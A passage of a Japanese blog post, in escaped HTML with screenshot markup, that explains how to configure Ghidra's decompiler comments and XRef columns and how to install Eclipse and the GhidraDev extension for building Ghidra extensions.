/static/744c0e97a8191b42acd67a08ec4ff572/26abe/image-20220315190317307.png 251w&quot;
            sizes=&quot;(max-width: 251px) 100vw, 251px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/744c0e97a8191b42acd67a08ec4ff572/26abe/image-20220315190317307.png&quot;
            alt=&quot;image-20220315190317307&quot;
            title=&quot;image-20220315190317307&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;デコンパイラウィンドウのコメント&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%A9%E3%82%A6%E3%82%A3%E3%83%B3%E3%83%89%E3%82%A6%E3%81%AE%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88&quot; aria-label=&quot;デコンパイラウィンドウのコメント permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;デコンパイラウィンドウのコメント&lt;/h3&gt;
&lt;p&gt;Code Brouserの[Edit]&gt;[Tool Options]から[Decompiler]を選び、デフォルトで非表示になっているコメントを表示するよう変更します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 823px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8d67ebfc323bc82c689865586b458b47/31aff/image-20220315185220108.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 66.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACQUlEQVQ4y4WTTY/SUBSG+4Nc+Af8L0YTN27cm7h0MzsSViwmGWczbicxYiZDQowbNlSkpWlv29sPoPSDFigfLfB6bmHQqIxN3tze9vbJe95zKmmDLphpI4wiFEWBsiyRL5cYj8eI4xgRPReahOHp3rY4uMfQ/PgDL5/e4fWzOzx/8gWfPgwgWZaJQV/GbJrg4Sq3W4IlyLIMaZpWmtL7wzqF43A43EXr22e8q7/C+8YbvK29QLvThBQFHM2Ogo4RVLA9qShKchKfAEJJcgAG5NyxbRgGAzdVRCMZ4aiHJPiOOHIhcaODr7IK1Zui3KwraAWM/waKCIZUujeZwPQ82KMxbC+AZblw3DHCMIbEdBmerR+9HUsu/w1MKQJ+ewul0YB+fQ398hKx3MV8tcIsS6szkk22VbUPmzvY7w/Q4gxQZDrqdmHc34O12zBbLUSMIZ3NkB7PSBaTwYwBWfaw2+0eBYp9PJ+D+T5014VBZQ8MAx6tQmIyJE7dUhQVNgWd5/mjGQqHXNdh9HowFQWs38eEwAmNUnzMWDKZCkPXKvpmszkPpH1GpXk3N1AuLqDVajDqdYRXV8jI5ZxmtyrZ9x0Mhz6WyxW2NH//y9AbjaizHlxaLYe+DQL6fgiXnIY0AdJ6vTl199SUM3MoNCVFYnQIwMiZTE1SqfwexeBTtgRc489rW/0pv4BiFTCHHD3INE2aP6v6o/J8WeVflSwOC+iKZklI3M+pk8L+70CxFyBdNIWcaZoGzjkWiwUpryTO/gS0FMCUyoIyoQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8d67ebfc323bc82c689865586b458b47/8ac56/image-20220315185220108.webp 240w,
/static/8d67ebfc323bc82c689865586b458b47/d3be9/image-20220315185220108.webp 480w,
/static/8d67ebfc323bc82c689865586b458b47/7fbc2/image-20220315185220108.webp 823w&quot;
              sizes=&quot;(max-width: 823px) 100vw, 823px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8d67ebfc323bc82c689865586b458b47/8ff5a/image-20220315185220108.png 240w,
/static/8d67ebfc323bc82c689865586b458b47/e85cb/image-20220315185220108.png 480w,
/static/8d67ebfc323bc82c689865586b458b47/31aff/image-20220315185220108.png 823w&quot;
            sizes=&quot;(max-width: 823px) 100vw, 823px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8d67ebfc323bc82c689865586b458b47/31aff/image-20220315185220108.png&quot;
            alt=&quot;image-20220315185220108&quot;
            title=&quot;image-20220315185220108&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;xrefの表示設定の追加&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#xref%E3%81%AE%E8%A1%A8%E7%A4%BA%E8%A8%AD%E5%AE%9A%E3%81%AE%E8%BF%BD%E5%8A%A0&quot; aria-label=&quot;xrefの表示設定の追加 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;XRefの表示設定の追加&lt;/h3&gt;
&lt;p&gt;Listingウィンドウから参照できるXRefウィンドウの列を追加します。&lt;/p&gt;
&lt;p&gt;とりあえずFunction Nameがあると便利です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 814px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f24de6390e7b5eb43351e9f72579daea/a4262/image-20220315185557616.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 80.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAADMUlEQVQ4y4WUaVNaWRCG+c8zVUll/DD5A5kFNRCNOokaDQaNmk0wGkGCGBMxIPtFdmS5FxAQ2Z7pe4nOmJqp3OKt7j6c85zTZ2mT2igy6PcYDvr0+3263e4tDYdDww4GA8PXpft6X0O9Pr1ej1a9Q78Dpo23TmwvX7H5Zgun04nX6+XTp0M+fz4iGAwSCp0SiUSIxWLE43ESiQSZdJpCoUA+nyORTBAOh6k3auifadXhweGL4AsohKMKqWyRL8cBPN4j/F/DBE6jJFM5Cuca0XiKL/4g+WKFXGGkfLEq0Kz8n0ZtqJgq5RKX7RY9SavTueKy06HRuEBVNSqVKhcXF1xedqhqZYqlIqVSmWazaajVatFut1E1jWy5jFLKCFAGadJQrVYFohrS41qtZkj3NYEHQiccnxzLNoQkVQGXKyhKEiV5xrlMonOSqRSmcqVyM/gW5Juu42hMIRRNUijXaXaGtK4gpmTJnauGr7cllLN/gP9e1fdg3Q8Eguxub3N8dERKDkaX1+3G5/GIHzd04vfrKf8Y2KjX2dpzMza+yF3zc8as64xNv+aO2cZPD+YZm3rFPdHme89t4P+pLkCne5/7Vhs//7bInQk7vzza5N5DO3f/XOL+3Ba/zjl4veP97z38fpU68KPHy5PZWSwTZpYX5nmzsc7T2RkePZxgY9XO5toq+7IFpmpVNQbq10QffH3KqqbenHqtpuH5eIBlaobHc/PYVjdYfrGOdXqOP8YtLNnWJH7Jnmsfk6IocrdKlOUe6arIdbi2N75k4dr3YBXgpGWK5ytr2OzrTM/8xfikdRRfA8PROOlsnky2QCqTJZ46EytPSqzuK+kUmUwGl3R+PPvEAD5dWDIgOtA8YTFgKzLBnktSLtT65LWuoax6RarSEtshIs8rUlDJSpzP59n94DJWowMXntkkTTuT1mke/G5mYWmFxeUXHPgOMXWlUkjBoNuTCmJUFBiIdCs/aRsaKftPvvJ+5wNv3znYc3vwHByyvbPLO4dT3r0Pr8SnpyFMrabGVeOKptaQMtRm9H0jih3KJJFIlFwuNzogOaxkvkw4XZKiINtzlhw9W5He528XVXDPqwae3wAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f24de6390e7b5eb43351e9f72579daea/8ac56/image-20220315185557616.webp 240w,
/static/f24de6390e7b5eb43351e9f72579daea/d3be9/image-20220315185557616.webp 480w,
/static/f24de6390e7b5eb43351e9f72579daea/f23e7/image-20220315185557616.webp 814w&quot;
              sizes=&quot;(max-width: 814px) 100vw, 814px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f24de6390e7b5eb43351e9f72579daea/8ff5a/image-20220315185557616.png 240w,
/static/f24de6390e7b5eb43351e9f72579daea/e85cb/image-20220315185557616.png 480w,
/static/f24de6390e7b5eb43351e9f72579daea/a4262/image-20220315185557616.png 814w&quot;
            sizes=&quot;(max-width: 814px) 100vw, 814px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f24de6390e7b5eb43351e9f72579daea/a4262/image-20220315185557616.png&quot;
            alt=&quot;image-20220315185557616&quot;
            title=&quot;image-20220315185557616&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;eclipseのセットアップ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#eclipse%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97&quot; aria-label=&quot;eclipseのセットアップ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Eclipseのセットアップ&lt;/h2&gt;
&lt;p&gt;Ghidraの拡張機能をビルドするためにまずはEclipseをインストールします。&lt;/p&gt;
&lt;p&gt;WindowsでもLinuxでも以下からダウンロードしたインストーラを実行するとインストールできます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.eclipse.org/downloads/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Eclipse Downloads | The Eclipse Foundation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回は一番上のJava Developersを選択してインストールしました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 673px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5e3eda644c802f97ca4597bc80076259/c391c/image-20220306224652292.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 100.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAADa0lEQVQ4y4VUW4/bVBDOj4L/xyPv8MoDPCGQEEIFHoqKUm27Zbukm9iO147j+3XjJHZsx5fY+zFz0rhLVcSRJjNnzsl4vm9mzmQ6fYn53QKz2TvSd5Du/oa0YH0LWVpAlhUSGZIknWUxh6QaWP7yBbSvPoP29edQnn2JV9dv8fy3nzFRZBU3r+e4ms6wpMCtd42j+xdq8wWKXYLtdofikKOuj6iPLBXZNeosQvOgok4UNMUGvq3DkN5gMn15Bd10IdNXVd2EtrKgG6QNC/dks4/1ZT+K4eLeDISoZC81A1evrzGRCA6vphtQHltUdYe8qIV9bLrRd2xOqNue7r2X9jQK3xseAUWRMZEJsr1Wkfg6fC+FtfZhWwFcO4LnxrApA0214VghHh8H0M8ow9ALH2tey+XyzKG3WSHdB9imO/hBgCiKkCQJ6VjYnuchDCMURYEsy7Hb7YVkWYayLLHf7wWvXLQJR72spqnRnTrUpNu2OUvXioJcsvh4PVKmfX8+UxSFMqSf9Uqn7FJE4ZZgP8B1YsTRlvap2IfBRuxdOxZnLJYZwiFa+n4YgwvI3GM/fPsNDF1Dmu7psg/fDwlmQDqCZbmwbQ+uGxCnwVnTmU1+zwuprbYC+ul0Oge8QB4o9bI8oKoK5IeMeNnhUOR0eY88z0Z7t9vSh1MRJM9zEfBwODwpCkHuOmqJusEhr1AWR+y2ORXgSHaNqqzJXyLbF8Tp6T95HDmcv5vh++9+JCghAj+Bdm+e28YJibuEuNsIzoyVR9nlY4CnMgzDhwyXFDUOE4JbiUpypfv+RFm35CtEpT+VzUULuv4V8D2H3KAMnS82TUsk93SRvk5VbNtOUNKR5hbhAE+FCzJCXszv8Mfvf1IDn9tF1xysDZ6WkKYmoBdnjZXuEvRUtNFKo7mVTSpE9ekM+Tl6NX2Dh4dUdLzvBzQVIWkfAU1NHMfCZh/bH/suU1VVFT2BM4asjpx0XUfpd2KMmEPmk6ek6xqx59HjPx7pGeORY5s13x8hy7IEU7eQ5YWAFPgbauBknJTAZyoSYf/fEpDVpYRff3pOExES5ExMQhTyw5AQDRuhbcsTE8QNzMLUcGOzvtjMo8jw9vZWtEy6oafLtmAYK5jmGo7rwHFseL4nNItlWXRmCmGbxTAMOnMEHTc3N/gHHQjUoPHKVFsAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/5e3eda644c802f97ca4597bc80076259/8ac56/image-20220306224652292.webp 240w,
/static/5e3eda644c802f97ca4597bc80076259/d3be9/image-20220306224652292.webp 480w,
/static/5e3eda644c802f97ca4597bc80076259/b8cf5/image-20220306224652292.webp 673w&quot;
              sizes=&quot;(max-width: 673px) 100vw, 673px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/5e3eda644c802f97ca4597bc80076259/8ff5a/image-20220306224652292.png 240w,
/static/5e3eda644c802f97ca4597bc80076259/e85cb/image-20220306224652292.png 480w,
/static/5e3eda644c802f97ca4597bc80076259/c391c/image-20220306224652292.png 673w&quot;
            sizes=&quot;(max-width: 673px) 100vw, 673px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/5e3eda644c802f97ca4597bc80076259/c391c/image-20220306224652292.png&quot;
            alt=&quot;image-20220306224652292&quot;
            title=&quot;image-20220306224652292&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;ghidra-develop-toolsをeclipseにインストールする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ghidra-develop-tools%E3%82%92eclipse%E3%81%AB%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;ghidra develop toolsをeclipseにインストールする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Ghidra Develop ToolsをEclipseにインストールする&lt;/h3&gt;
&lt;p&gt;Eclipseのインストールが完了したらGhidra Develop Toolsをインストールします。&lt;/p&gt;
&lt;p&gt;インストールのために、GhidraのScript Managerから適当なスクリプトを右クリックして[Edit with Eclipse]を選択します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f71d2b069a1b29992a50753bbd388f37/25c1c/image-20220306224922771.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 65.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACvUlEQVQ4y2WS7U/aUBTG+a+X7MsSN50bilGXxUWz6LbED07J1GR8QCcaFAF5LW0pbWnpK+VFRAQV9Nm5RTHLmjy597Tn/M5z72lg9et3vHr9Fm+mgpianse7mRCm35Nm5nzNh5axtLyCpU9fsEjr7McFfAguYHYuhNlgiPahcRyaR3AxiMBGOIq19Th+buew/iOOz6sHWFw7wspmGhvhHL79ymFzL42d/TgihxeIJYo4S/OIJhL4k0jiJB6nd0lEz85wEjtFwLJ1mDUejtfGcZpDhAq2DlPYjyUROS3gICPjOKcgfHiOnaMUwkdphGNp/E6wXA67xxfYPclgO3qKSDyDgFc34ZoEbHQg6zbYU2+2UQnvQdvcgr2ziyteht1ow7Qc1AyLVtfPuxs+onXZRf92CEXVwIkyAT0LjilAUmoQSP37R1RNF6nzJCp5Hi29jobdQqmsoihIvkpU2O0P0endwm120Or26buMfKmMgGlqcAweVcOFqBqgZrDcJvKyDF7S4Dau0WoPIEoqBEmBWFFRUWvoDUa4Hgxpr/tQ9r7AgLquwNSLUKoGpOoYaDgeyuUqNM1Go9GF7ZBDseK74EkSQXq3I3J5D44cs/ufAL26BZscClQgUWfKg2F7yBZK/vFkatLs9Aik+DCBCsty1XfHgCz22lcvwDoNhQH1mjUB6nTphZLod2dH6t7c+TCOmjIwc/vssEp1zc71GMgTsNmw4dmiP70KOzIBNRpKtsj7l+9dXlPxg39MdndsVTQTN3cP5HJEzWlolCM8A2VVgSTzKFIgyBoljujIdXJSoUGM3XR6A5r+A27ogtl3ph7bk/q091pXfm62KCKQzOSIToWVKhKZPFlXYND/ZtouyXmR5fwbTzTOc9w6UgUBgTxXInIROY7zlS1yEGUFil6DrOmT9T/pT3qKVcPwa/8CIP2R0ZPdw5gAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f71d2b069a1b29992a50753bbd388f37/8ac56/image-20220306224922771.webp 240w,
/static/f71d2b069a1b29992a50753bbd388f37/d3be9/image-20220306224922771.webp 480w,
/static/f71d2b069a1b29992a50753bbd388f37/e46b2/image-20220306224922771.webp 960w,
/static/f71d2b069a1b29992a50753bbd388f37/5c912/image-20220306224922771.webp 1047w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f71d2b069a1b29992a50753bbd388f37/8ff5a/image-20220306224922771.png 240w,
/static/f71d2b069a1b29992a50753bbd388f37/e85cb/image-20220306224922771.png 480w,
/static/f71d2b069a1b29992a50753bbd388f37/d9199/image-20220306224922771.png 960w,
/static/f71d2b069a1b29992a50753bbd388f37/25c1c/image-20220306224922771.png 1047w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f71d2b069a1b29992a50753bbd388f37/d9199/image-20220306224922771.png&quot;
            alt=&quot;image-20220306224922771&quot;
            title=&quot;image-20220306224922771&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここで、Eclipseのフルパスを指定します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8f9363e76f9e7370da358852fc15bb21/d7ab4/image-20220306225022503.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 62.083333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAAB9UlEQVQoz22SW2/aQBCF/fNRL1AuuYGaP9CHVpWqvlSRIiWFxICxDV5fMcFOpDYkxcbEfSGnswOEOKmlT7Pesc/O7Bml2WqiXKlhb7+Jo9YxDpvHKL2volSu4m11D42jj6gdtJ4olWt4U6mjXN9HpXHAfGgc4l29ik9fPkP5dtrB19NLfG/r+NF3cEJYQQj/OoYbTeFcXcGd7vCiiHGn0xdEcMYhlCi+wTSKkaQLrB4fKWYwHBejICgw9P2nuF0X8oRF+0qapnj+5PlfDD0fA9vGebeHM7ULzRIY+QHvm573CsN1WVDQN0qSrAVXqxXHhzyH6Xr8s6AWuuYQP3t9tPsa0x9ZGFFuJCslMRmtTeUsOE+StSC1y4IPOZ3ocUW640A1DFwMdFzqBK0FVWOT0BpaB2MMhMdtFyv8j6BsRaIJQa2rOOt2Wej37S1m9/eY3d3hzzxBGF9z6yKQgmRGQXDTshS06HRrPOaPB8KGbjt88T65GpDTW5xw8qzl+abl1a5CKSiFdi6uhbd7pi/N2cGuU44FsywrmCJdfi1YZCteINwI+lTuIlsiXSyQLZeIf834VBGGjD2ZMPxO0SLni4x5IuTsWi7Nobxsg+7GoLkzKaqmRW6aNC4m2pqOk04P7Z6Gi/4AHYoq5V7SoXE6V3vQaMT+AfoeT/AfRujpAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8f9363e76f9e7370da358852fc15bb21/8ac56/image-20220306225022503.webp 240w,
/static/8f9363e76f9e7370da358852fc15bb21/d3be9/image-20220306225022503.webp 480w,
/static/8f9363e76f9e7370da358852fc15bb21/e46b2/image-20220306225022503.webp 960w,
/static/8f9363e76f9e7370da358852fc15bb21/dd5f8/image-20220306225022503.webp 1014w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8f9363e76f9e7370da358852fc15bb21/8ff5a/image-20220306225022503.png 240w,
/static/8f9363e76f9e7370da358852fc15bb21/e85cb/image-20220306225022503.png 480w,
/static/8f9363e76f9e7370da358852fc15bb21/d9199/image-20220306225022503.png 960w,
/static/8f9363e76f9e7370da358852fc15bb21/d7ab4/image-20220306225022503.png 1014w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8f9363e76f9e7370da358852fc15bb21/d9199/image-20220306225022503.png&quot;
            alt=&quot;image-20220306225022503&quot;
            title=&quot;image-20220306225022503&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでEclipseに拡張機能がインストールされ、上部のタブに[GhidraDev]が追加されます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e8fbd4cae5123539d422b89d463da5c4/159fb/image-20220307205731760.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB3UlEQVQ4y62TeW/aQBDF/f0/TqpIVStoaSVQ/6IxYBtjIL7vXR+cxeZ1dlOQcBOFSl3pp9nj7dOMvaP0+1+h6wbGP1U8qSoMc465acKyTKiaialhwV5ZcOxnuK5HuHA9D57nw/N9+ITtOAjDEI8fP0GxFiaqqgYrKoLBCWwkUYA08WEFDE/rBC7bw0kKsDwHLwqUZUl3KuS0TnMGxhjCjOPxcx/KYrHAbrvBYb9HXdeoq5IEHJwzaCsXX8ZL/LBS6C5dTmIyYciyTJKmGZarNcy5CT+IMBgMoEymM6zDEkG+xfH4C6fTCQVlIUh9FzGRhB5YlshMLmdXOJf7x8MBo9EIynJtI6rPYNsTxGjbVgo5CXlRyhI5p3Jpfd3vzIXhniqUhn4QSKPzuZWxaZobcdegG/829INrZl3De4z/2fA1/muG73/DNwzv4S7DtvtT2MvDfSvTi+Fut8NwOHwlQ3qHjm0jjCJqrQCO80w4iOMYSZLc8LIXIyJtTqa9Xg+K6MlLqe35LB+2EIuuORz2shSByEC0m4gCoRMaMd9sNtJjPB5DEe3THcJcIC41zelPbPDeMAwdyuDbd5jmAjNNg6brMqrqBOrklslkitlMk+cyXubElNrXspZ4ePiA38MhZ1w+0qy5AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e8fbd4cae5123539d422b89d463da5c4/8ac56/image-20220307205731760.webp 240w,
